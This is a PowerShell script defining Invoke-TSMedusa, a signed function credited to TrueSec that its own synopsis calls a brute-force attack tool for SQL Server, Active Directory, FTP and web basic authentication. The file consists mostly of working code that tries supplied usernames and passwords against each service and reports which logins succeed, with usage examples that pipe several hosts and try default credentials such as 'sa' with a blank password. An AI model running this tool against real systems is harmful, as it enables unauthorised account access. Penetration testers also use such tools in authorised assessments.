function Invoke-TSMedusa {
  <#
    .SYNOPSIS
    Performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.

    .DESCRIPTION
    Invoke-TSMedusa tries to login to SQL, ActiveDirectory, Web or FTP using a specific account and password.
    You can also specify a password-list as input as shown in the Example section.

    .PARAMETER Identity
    Specifies a SQL Server, FTP Site or Web Site.

    .PARAMETER UserName
    Specifies a UserName. If blank, trusted connection will be used for SQL and anonymous access will be used for FTP.

    .PARAMETER Password
    Specifies a Password.

    .PARAMETER Service
    Enter a Service. Default service is set to SQL.

    .EXAMPLE
    Invoke-TSMedusa -Identity SRV01 -UserName sa -Password ""

    .EXAMPLE
    Invoke-TSMedusa -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP

    .EXAMPLE
    "SRV01","SRV02","SRV03" | Invoke-TSMedusa -UserName sa -Password sa

    .EXAMPLE
    Invoke-TSMedusa -Identity "domain.local" -UserName administrator -Password Password1 -Service ActiveDirectory

    .EXAMPLE
    Invoke-TSMedusa -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web

    .LINK
    http://www.truesec.com

    .NOTES
    Goude 2012, TreuSec
  #>
  Param(
    [Parameter(Mandatory = $true,
      Position = 0,
      ValueFromPipeLineByPropertyName = $true)]
    [Alias("PSComputerName","CN","MachineName","IP","IPAddress","ComputerName","Url","Ftp","Domain","DistinguishedName")]
    [string]$Identity,

    [parameter(Position = 1,
      ValueFromPipeLineByPropertyName = $true)]
    [string]$UserName,

    [parameter(Position = 2,
      ValueFromPipeLineByPropertyName = $true)]
    [string]$Password,

    [parameter(Position = 3)]
    [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
    [string]$Service = "SQL"
  )
  Process {
    if($service -eq "SQL") {
      $Connection = New-Object System.Data.SQLClient.SQLConnection
      if($userName) {
        $Connection.ConnectionString = "Data Source=$identity;Initial Catalog=Master;User Id=$userName;Password=$password;"
      } else {
        $Connection.ConnectionString = "server=$identity;Initial Catalog=Master;trusted_connection=true;"
      }
      Try {
        $Connection.Open()
        $success = $true
      }
      Catch {
        $success = $false
      }
      if($success -eq $true) {
        $message = switch($connection.ServerVersion) {
          { $_ -match "^6" } { "SQL Server 6.5";Break }
          { $_ -match "^6" } { "SQL Server 7";Break }
          { $_ -match "^8" } { "SQL Server 2000";Break }
          { $_ -match "^9" } { "SQL Server 2005";Break }
          { $_ -match "^10\.00" } { "SQL Server 2008";Break }
          { $_ -match "^10\.50" } { "SQL Server 2008 R2";Break }
          Default { "Unknown" }
        }
      } else {
        $message = "Unknown"
      }
    } elseif($service -eq "FTP") {
      if($identity -notMatch "^ftp://") {
        $source = "ftp://" + $identity
      } else {
        $source = $identity
      }
      try {
        $ftpRequest = [System.Net.FtpWebRequest]::Create($source)
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
        $ftpRequest.Credentials = new-object System.Net.NetworkCredential($userName, $password)
        $result = $ftpRequest.GetResponse()
        $message = $result.BannerMessage + $result.WelcomeMessage
        $success = $true
      } catch {
        $message = $error[0].ToString()
        $success = $false
      }
    } elseif($service -eq "ActiveDirectory") {
      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
      $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
      Try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $identity)
        $success = $true
      }
      Catch {
        $message = "Unable to contact Domain"
        $success = $false
      }
      if($success -ne $false) {
        Try {
          $success = $principalContext.ValidateCredentials($username, $password)
          $message = "Password Match"
        }
        Catch {
          $success = $false
          $message = "Password doesn't match"
        }
      }
    } elseif($service -eq "Web") {
      if($identity -notMatch "^(http|https)://") {
        $source = "http://" + $identity
      } else {
        $source = $identity
      }
      $webClient = New-Object Net.WebClient
      $securePassword = ConvertTo-SecureString -AsPlainText -String $password -Force
      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $userName, $securePassword
      $webClient.Credentials = $credential
      Try {
        $message = $webClient.DownloadString($source)
        $success = $true
      }
      Catch {
        $success = $false
        $message = "Password doesn't match"
      }
    }
    # Return Object
    New-Object PSObject -Property @{
      ComputerName = $identity;
      UserName = $username;
      Password = $Password;
      Success = $success;
      Message = $message
    } | Select-Object Success, Message, UserName, Password, ComputerName
  }
}

# SIG # Begin signature block
# MIINGAYJKoZIhvcNAQcCoIINCTCCDQUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU4rpRHJIRtY5+nbFEUZ2QbqxO
# HcGgggpaMIIFIjCCBAqgAwIBAgIQAupQIxjzGlMFoE+9rHncOTANBgkqhkiG9w0B
# AQsFADByMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD
# VQQLExB3d3cuZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFz
# c3VyZWQgSUQgQ29kZSBTaWduaW5nIENBMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcy
# MjEyMDAwMFowaTELMAkGA1UEBhMCQ0ExCzAJBgNVBAgTAk9OMREwDwYDVQQHEwhI
# YW1pbHRvbjEcMBoGA1UEChMTRGF2aWQgV2F5bmUgSm9obnNvbjEcMBoGA1UEAxMT
# RGF2aWQgV2F5bmUgSm9obnNvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
# ggEBAM3+T+61MoGxUHnoK0b2GgO17e0sW8ugwAH966Z1JIzQvXFa707SZvTJgmra
# ZsCn9fU+i9KhC0nUpA4hAv/b1MCeqGq1O0f3ffiwsxhTG3Z4J8mEl5eSdcRgeb+1
# jaKI3oHkbX+zxqOLSaRSQPn3XygMAfrcD/QI4vsx8o2lTUsPJEy2c0z57e1VzWlq
# KHqo18lVxDq/YF+fKCAJL57zjXSBPPmb/sNj8VgoxXS6EUAC5c3tb+CJfNP2U9vV
# oy5YeUP9bNwq2aXkW0+xZIipbJonZwN+bIsbgCC5eb2aqapBgJrgds8cw8WKiZvy
# Zx2qT7hy9HT+LUOI0l0K0w31dF8CAwEAAaOCAbswggG3MB8GA1UdIwQYMBaAFFrE
# uXsqCqOl6nEDwGD5LfZldQ5YMB0GA1UdDgQWBBTnMIKoGnZIswBx8nuJckJGsFDU
# lDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwdwYDVR0fBHAw
# bjA1oDOgMYYvaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItYXNzdXJlZC1j
# cy1nMS5jcmwwNaAzoDGGL2h0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9zaGEyLWFz
# c3VyZWQtY3MtZzEuY3JsMEIGA1UdIAQ7MDkwNwYJYIZIAYb9bAMBMCowKAYIKwYB
# BQUHAgEWHGh0dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwgYQGCCsGAQUFBwEB
# BHgwdjAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tME4GCCsG
# AQUFBzAChkJodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRTSEEy
# QXNzdXJlZElEQ29kZVNpZ25pbmdDQS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG
# 9w0BAQsFAAOCAQEAVlkBmOEKRw2O66aloy9tNoQNIWz3AduGBfnf9gvyRFvSuKm0
# Zq3A6lRej8FPxC5Kbwswxtl2L/pjyrlYzUs+XuYe9Ua9YMIdhbyjUol4Z46jhOrO
# TDl18txaoNpGE9JXo8SLZHibwz97H3+paRm16aygM5R3uQ0xSQ1NFqDJ53YRvOqT
# 60/tF9E8zNx4hOH1lw1CDPu0K3nL2PusLUVzCpwNunQzGoZfVtlnV2x4EgXyZ9G1
# x4odcYZwKpkWPKA4bWAG+Img5+dgGEOqoUHh4jm2IKijm1jz7BRcJUMAwa2Qcbc2
# ttQbSj/7xZXL470VG3WjLWNWkRaRQAkzOajhpTCCBTAwggQYoAMCAQICEAQJGBtf
# 1btmdVNDtW+VUAgwDQYJKoZIhvcNAQELBQAwZTELMAkGA1UEBhMCVVMxFTATBgNV
# BAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIG
# A1UEAxMbRGlnaUNlcnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTEzMTAyMjEyMDAw
# MFoXDTI4MTAyMjEyMDAwMFowcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lD
# ZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGln
# aUNlcnQgU0hBMiBBc3N1cmVkIElEIENvZGUgU2lnbmluZyBDQTCCASIwDQYJKoZI
# hvcNAQEBBQADggEPADCCAQoCggEBAPjTsxx/DhGvZ3cH0wsxSRnP0PtFmbE620T1
# f+Wondsy13Hqdp0FLreP+pJDwKX5idQ3Gde2qvCchqXYJawOeSg6funRZ9PG+ykn
# x9N7I5TkkSOWkHeC+aGEI2YSVDNQdLEoJrskacLCUvIUZ4qJRdQtoaPpiCwgla4c
# SocI3wz14k1gGL6qxLKucDFmM3E+rHCiq85/6XzLkqHlOzEcz+ryCuRXu0q16XTm
# K/5sy350OTYNkO/ktU6kqepqCquE86xnTrXE94zRICUj6whkPlKWwfIPEvTFjg/B
# ougsUfdzvL2FsWKDc0GCB+Q4i2pzINAPZHM8np+mM6n9Gd8lk9ECAwEAAaOCAc0w
# ggHJMBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQM
# MAoGCCsGAQUFBwMDMHkGCCsGAQUFBwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDov
# L29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8vY2FjZXJ0cy5k
# aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3J0MIGBBgNVHR8E
# ejB4MDqgOKA2hjRodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1
# cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v
# RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsME8GA1UdIARIMEYwOAYKYIZIAYb9
# bAACBDAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BT
# MAoGCGCGSAGG/WwDMB0GA1UdDgQWBBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAfBgNV
# HSMEGDAWgBRF66Kv9JLLgjEtUYunpyGd823IDzANBgkqhkiG9w0BAQsFAAOCAQEA
# PuwNWiSz8yLRFcgsfCUpdqgdXRwtOhrE7zBh134LYP3DPQ/Er4v97yrfIFU3sOH2
# 0ZJ1D1G0bqWOWuJeJIFOEKTuP3GOYw4TS63XX0R58zYUBor3nEZOXP+QsRsHDpEV
# +7qvtVHCjSSuJMbHJyqhKSgaOnEoAjwukaPAJRHinBRHoXpoaK+bp1wgXNlxsQyP
# u6j4xRJon89Ay0BEpRPw5mQMJQhCMrI2iiQC/i9yfhzXSUWW6Fkd6fp0ZGuy62ZD
# 2rOwjNXpDd32ASDOmTFjPQgaGLOBm0/GkxAG/AeB+ova+YJJ92JuoVP6EpQYhS6S
# kepobEQysmah5xikmmRR7zGCAigwggIkAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUw
# EwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20x
# MTAvBgNVBAMTKERpZ2lDZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcg
# Q0ECEALqUCMY8xpTBaBPvax53DkwCQYFKw4DAhoFAKB4MBgGCisGAQQBgjcCAQwx
# CjAIoAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGC
# NwIBCzEOMAwGCisGAQQBgjcCARUwIwYJKoZIhvcNAQkEMRYEFH70XvmCL7JZk/0Z
# bvR/C67a6Be9MA0GCSqGSIb3DQEBAQUABIIBAMIwKr1Thp9eWI66hfkyk5O/yGgX
# /wxeXuWSfWgY/Dm1tDICvrPGPo1XnrIxvqWL2HqRQL3DpMqbcDo3L8l5wjpZUnHj
# cFFlj6lsaxGE1x5JZ/v8hGLalrYZpOu6mHqnlpCM/NRb8qFTVxIcDV8BUGRgdyES
# lsb2CjF72SIMUgT7dcRM816JxBAAhNOKxKIdSvoJzy4ZclyGxz1FPysw7ucLIFzU
# sga+oQOgtN4HarcE3245Khj32gMKUF4BtFOdUoBgcwb0gIc7jJKTYLbcpZN8p+sJ
# We+TnPFi0Ix6IGyF/J6oDM2IymjDHpj+YJ6VgOZ9pAo4V2+dMpyjL89yAI0=
# SIG # End signature block
